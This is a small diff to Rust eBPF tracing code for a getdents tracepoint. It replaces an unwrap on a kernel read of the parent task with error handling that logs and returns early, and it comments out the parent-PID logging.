@@ -41,12 +41,17 @@ fn handle_getdents_enter(ctx: TracePointContext) -> Result<u32, u32> {
             let real_parent_ptr =
                 (task as usize + real_parent_offset as usize) as *const *const task_struct;
 
-            let real_parent = bpf_probe_read_kernel::<*const task_struct>(real_parent_ptr).unwrap();
+            let real_parent = bpf_probe_read_kernel::<*const task_struct>(real_parent_ptr);
 
-            (*real_parent).tgid
+            if real_parent.is_err() {
+                info!(&ctx, "fuck you");
+                return Err(0);
+            }
+
+            // (*real_parent).tgid
         };
 
-        info!(&ctx, "ppid is {}", ppid);
+        // info!(&ctx, "ppid is {}", ppid);
     }
     Ok(0)
 }
